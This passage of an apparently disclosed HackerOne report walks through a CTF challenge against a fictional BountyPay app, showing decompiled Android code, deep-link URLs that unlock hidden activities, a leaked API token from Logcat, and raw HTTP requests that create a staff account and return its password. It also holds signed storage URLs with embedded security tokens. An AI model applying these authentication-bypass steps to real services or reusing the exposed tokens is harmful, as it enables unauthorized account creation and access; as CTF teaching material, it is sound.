.jar file which allowed me to read the code of the APK together with JD-GUI. \u003c/p\u003e\n\n\u003cp\u003eOnce I had the code, I ran the APK using Android Studio\u0026#39;s \u0026quot;Profile or debug APK\u0026quot;. \u003c/p\u003e\n\n\u003cp\u003eThere are plenty of hints within the code and the first one I followed was using the deep links. This helped me understand how to load the 3 different Android Activities: \u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eone://part\u003c/li\u003e\n\u003cli\u003etwo://part\u003c/li\u003e\n\u003cli\u003ethree://part\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eEach part had a required URI with different parameters that were available in the code. \u003c/p\u003e\n\n\u003cp\u003eIn order to move from part one to part two, all I had to do was putting the following URL in the Launch Options: \u003ccode\u003eone://part?start=PartTwoActivity\u003c/code\u003e \u003c/p\u003e\n\n\u003cp\u003e![APK-1 screenshot]\u003c/p\u003e\n\n\u003cp\u003eI figured that I needed the \u003ccode\u003estart=PartTwoActivity\u003c/code\u003e together with a username as it was stated in the code: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e    if (getIntent() != null \u0026amp;\u0026amp; getIntent().getData() != null) {\n      String str = getIntent().getData().getQueryParameter(\u0026quot;start\u0026quot;);\n      if (str != null \u0026amp;\u0026amp; str.equals(\u0026quot;PartTwoActivity\u0026quot;) \u0026amp;\u0026amp; sharedPreferences.contains(\u0026quot;USERNAME\u0026quot;)) {\n        ...\n        startActivity(new Intent((Context)this, PartTwoActivity.class));\n      } \n    } \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOnce I was on the second Activity, I saw in the code that all inputs where invsible:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e    EditText editText = (EditText)findViewById(2131230834);\n    Button button = (Button)findViewById(2131230794);\n    TextView textView = (TextView)findViewById(2131231002);\n    editText.setVisibility(4);\n    button.setVisibility(4);\n    textView.setVisibility(4\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand all I had to do in order to make them visible was figuring out the params within the URL: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e      Uri uri = getIntent().getData();\n      String str1 = uri.getQueryParameter(\u0026quot;two\u0026quot;);\n      String str2 = uri.getQueryParameter(\u0026quot;switch\u0026quot;);\n      if (str1 != null \u0026amp;\u0026amp; str1.equals(\u0026quot;light\u0026quot;) \u0026amp;\u0026amp; str2 != null \u0026amp;\u0026amp; str2.equals(\u0026quot;on\u0026quot;)) {\n        editText.setVisibility(0);\n        button.setVisibility(0);\n        textView.setVisibility(0);\n      } \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTherefore, the URL was: \u003ccode\u003etwo://part?two=light\u0026amp;switch=on\u003c/code\u003e. This resulted with a hash, an input field which asked for a header name. \u003c/p\u003e\n\n\u003cp\u003e![Apk-2 Screenshot]\u003c/p\u003e\n\n\u003cp\u003eWhile doing some recon, I already saw a suspicious base64 code in the 3rd Activity:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e  byte[] decodedDirectory = Base64.decode(\u0026quot;aG9zdA==\u0026quot;, 0);\n\n  byte[] decodedDirectoryTwo = Base64.decode(\u0026quot;WC1Ub2tlbg==\u0026quot;, 0);\n\n  final String directory = \u0026quot;aG9zdA==\u0026quot;;\n\n  final String directoryTwo = \u0026quot;WC1Ub2tlbg==\u0026quot;;\n\n  final String headerDirectory = \u0026quot;header\u0026quot;;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eDecoding both resulted with the following strings: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ \u0026quot;WC1Ub2tlbg==\u0026quot; | base64 -d\nX-Token: \n$ \u0026quot;aG9zdA==\u0026quot; | base64 -d\nhost\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUsing the \u003ccode\u003eX-Token\u003c/code\u003e header I got to the 3rd Activity, which again had insvisible components: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eprotected void onCreate(Bundle paramBundle) {\n    ...\n    final EditText editText = (EditText)findViewById(2131230837);\n    final Button button = (Button)findViewById(2131230796);\n    editText.setVisibility(4);\n    button.setVisibility(4);\n    ...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLooking into the code, I saw that there was an HTTP rqeuest that was supposed to be fired once everything had been loaded correctly: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e    this.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {\n            public void onCancelled(DatabaseError param1DatabaseError) {\n              Log.e(\u0026quot;TAG\u0026quot;, \u0026quot;onCancelled\u0026quot;, (Throwable)param1DatabaseError.toException());\n            }\n\n            public void onDataChange(DataSnapshot param1DataSnapshot) {\n              String str = (String)param1DataSnapshot.getValue();\n              if (firstParam != null \u0026amp;\u0026amp; decodedFirstParam.equals(\u0026quot;PartThreeActivity\u0026quot;) \u0026amp;\u0026amp; secondParam != null \u0026amp;\u0026amp; decodedSecondParam.equals(\u0026quot;on\u0026quot;)) {\n                String str1 = thirdParam;\n                if (str1 != null) {\n                  StringBuilder stringBuilder = new StringBuilder();\n                  stringBuilder.append(\u0026quot;X-\u0026quot;);\n                  stringBuilder.append(str);\n                  if (str1.equals(stringBuilder.toString())) {\n                    editText.setVisibility(0);\n                    button.setVisibility(0);\n                    PartThreeActivity.this.thread.start();\n                  } \n                } \n              } \n            }\n          });\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUsing the following URL: \u003ccode\u003ethree://part?switch=b24%3D\u0026amp;three=UGFydFRocmVlQWN0aXZpdHk%3D\u0026amp;header=X-Token\u003c/code\u003e I was able to execute this code\u003c/p\u003e\n\n\u003cp\u003e![Apk-3 Screenshot]\u003c/p\u003e\n\n\u003cp\u003eI got the \u003ccode\u003eHOST\u003c/code\u003e header and the \u003ccode\u003eX-Token\u003c/code\u003e header in Android Studio\u0026#39;s Logcat\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e2020-06-09 20:06:37.938 6261-6309/bounty.pay D/HOST¬†IS:: http://api.bountypay.h1ctf.com\n2020-06-09 20:06:37.939 6261-6309/bounty.pay D/TOKEN¬†IS:: 8e9998ee3137ca9ade8f372739f062c1\n2020-06-09 20:06:37.940 6261-6309/bounty.pay D/HEADER¬†VALUE¬†AND¬†HASH: X-Token: 8e9998ee3137ca9ade8f372739f062c1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e![Logcat Screenshot]\u003c/p\u003e\n\n\u003cp\u003eIt\u0026#39;s important to note that I didn\u0026#39;t really have to open the APK in an emulator, as I could have edited the \u003ccode\u003euser_created.xml\u003c/code\u003e via \u003ccode\u003eadb\u003c/code\u003e. However, I wanted to actually see what I was facing with as it made it much more clear for me. \u003c/p\u003e\n\n\u003cp\u003eThe last Activity had helped me to figure that there\u0026#39;s more than just a token and a host. There were two more things that will be useful in the next two steps: \u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eThere\u0026#39;s a POST request to the exposed host, but something is missing. \u003c/li\u003e\n\u003cli\u003eThe twitter handle made me think that I might have missed something while doing my recon, so I got back to it and found that there was a new employe called Sandra.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch3 id=\"step-8-information-disclosure-twitter-account\"\u003eStep 8 - Information Disclosure (Twitter Account)\u003c/h3\u003e\n\n\u003cp\u003eBountyPay\u0026#39;s \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FBountypayHQ\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eTwitter account\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FBountypayHQ%2Fstatus%2F1258692286256500741\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003etweeted a welcome message\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e about a new employe. Looking for this employee, I found an interesting string which seemed like an ID: \u003cbr\u003e\n\u003ca title=\"https://twitter.com/SandraA76708114/status/1258693001964068864/photo/1\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FSandraA76708114%2Fstatus%2F1258693001964068864%2Fphoto%2F1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/SandraA76708114/status/1258693001964068864/photo/1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e[Sandra\u0026#39;s screenshot]\u003c/p\u003e\n\n\u003ch3 id=\"step-9-authentication-bypass-creating-sandra-s-user\"\u003eStep 9 - Authentication Bypass (Creating Sandra\u0026#39;s user)\u003c/h3\u003e\n\n\u003cp\u003eAfter I saw APK POST request, host, X-Token I went back to my notes, as I remembered that there were few endpoints that I wasn\u0026#39;t able to test. \u003c/p\u003e\n\n\u003cp\u003eClearly, as Sandra was part of the staff, I first tried to hit \u003ccode\u003ehttps://api.bountypay.h1ctf.com/api/staff\u003c/code\u003e using the X-Token. This gave me an interesting result: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /api/staff? HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eResponse\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[{\u0026quot;name\u0026quot;:\u0026quot;Sam Jenkins\u0026quot;,\u0026quot;staff_id\u0026quot;:\u0026quot;STF:84DJKEIP38\u0026quot;},{\u0026quot;name\u0026quot;:\u0026quot;Brian Oliver\u0026quot;,\u0026quot;staff_id\u0026quot;:\u0026quot;STF:KE624RQ2T9\u0026quot;}]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter I saw this, I tried to do the same with the following POST request: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /api/staff?firstParam=UGFydFRocmVlQWN0aXZpdHk%3D HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Length: 23\nContent-Type: application/x-www-form-urlencoded\n\nstaff_id=STF:84DJKEIP38\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut that resutled with the following reponse: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 409 Conflict\nServer: nginx/1.14.0 (Ubuntu)\nDate: Wed, 03 Jun 2020 13:15:29 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 39\n\n[\u0026quot;Staff Member already has an account\u0026quot;]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow I went back to Sandra\u0026#39;s id and tried her \u003ccode\u003estaff_id\u003c/code\u003e: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Length: 36\nContent-Type: application/x-www-form-urlencoded\n\nstaff_id=STF:8FJ3KFISL3\u0026amp;staff_name=1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eResponse:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 201 Created\nServer: nginx/1.14.0 (Ubuntu)\nDate: Wed, 03 Jun 2020 19:42:33 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 110\n\n{\u0026quot;description\u0026quot;:\u0026quot;Staff Member Account Created\u0026quot;,\u0026quot;username\u0026quot;:\u0026quot;sandra.allison\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;s%3D8qB8zEpMnc*xsz7Yp5\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"step-10-csrf\"\u003eStep 10 - CSRF\u003c/h3\u003e\n\n\u003cp\u003eTBD \u003c/p\u003e\n\n\u003ch3 id=\"step-11-parameter-pollution\"\u003eStep 11 - Parameter Pollution\u003c/h3\u003e\n\n\u003cp\u003eTBD \u003c/p\u003e\n\n\u003ch3 id=\"step-12-privilege-escalation-via-csrf\"\u003eStep 12 - Privilege Escalation via CSRF\u003c/h3\u003e\n\n\u003cp\u003eTBD \u003c/p\u003e\n\n\u003ch3 id=\"step-13-information-disclosure-ceo-username\"\u003eStep 13 - Information Disclosure (CEO username \u0026amp; password)\u003c/h3\u003e\n\n\u003cp\u003eTBD \u003c/p\u003e\n\n\u003ch3 id=\"step-14-ssrf\"\u003eStep 14 - SSRF\u003c/h3\u003e\n\n\u003cp\u003eTBD \u003c/p\u003e\n\n\u003ch3 id=\"step-15-css-keylogger-via-ssrf\"\u003eStep 15 - CSS Keylogger via SSRF\u003c/h3\u003e\n\n\u003cp\u003eTBD \u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003e[list any additional material (e.g. screenshots, logs, etc.)]\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e[attachment / reference]\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eTBD\u003c/p\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[{"id":861010,"file_name":"apk-logcat.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ke12KSbVEVXy7hbK6kGwgk6Q?response-content-disposition=attachment%3B%20filename%3D%22apk-logcat.png%22%3B%20filename%2A%3DUTF-8%27%27apk-logcat.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070744Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026X-Amz-Signature=26f4b8d736008d8e721da6f39b6e15e935c21747ed0b01a6859ac47273f6bf69","file_size":150832,"type":"image/png"},{"id":861011,"file_name":"apk-part-1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/i5kLfwqWTs6jdUy8n2UVk5qj?response-content-disposition=attachment%3B%20filename%3D%22apk-part-1.png%22%3B%20filename%2A%3DUTF-8%27%27apk-part-1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070744Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026X-Amz-Signature=c6560899c9c754e1c7ba3df672fae70e140ad8dc38eb55305f3670e8af03a10a","file_size":619390,"type":"image/png"},{"id":861012,"file_name":"apk-3_.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/euDGE1oMtwGhn9eHRsxwPDko?response-content-disposition=attachment%3B%20filename%3D%22apk-3_.png%22%3B%20filename%2A%3DUTF-8%27%27apk-3_.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070744Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026X-Amz-Signature=3057706dd064d3a062b27e2007d6766740d557309b499e1f027276a869341158","file_size":332198,"type":"image/png"},{"id":861013,"file_name":"apk-2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/rZLkwmMvvr2cM5Nrgk8xZCUp?response-content-disposition=attachment%3B%20filename%3D%22apk-2.png%22%3B%20filename%2A%3DUTF-8%27%27apk-2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070744Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026X-Amz-Signature=4d10430624cd754ebd00db1b580f1b5910efc5c69072bb4c461d8f431b08a244","file_size":615917,"type":"image/png"},{"id":861014,"file_name":"sandra-allison.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jyYuDeyrZqgPuZ2gtC8iXJff?response-content-disposition=attachment%3B%20filename%3D%22sandra-allison.png%22%3B%20filename%2A%3DUTF-8%27%27sandra-allison.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070744Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026X-Amz-Signature=6f7ad97cdade6da2097298e5c6e071a5677f1cd87772d496adb147a0e8b8084c","file_size":3707551,"type":"image/png"}],"allow_singular_disclosure_at":"2020-07-19T16:11:07.721Z","allow_singular_disclosure_after":-14050596.782981632,"singular_disclosure_allowed":true,"vote_count":1,"voters":["gathii"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":48138,"asset_type":"URL","asset_identifier":"*.bountypay.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8245468,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I accidentally posted my report although I haven't finished writing it. I will add the final one in another comment, sorry for the 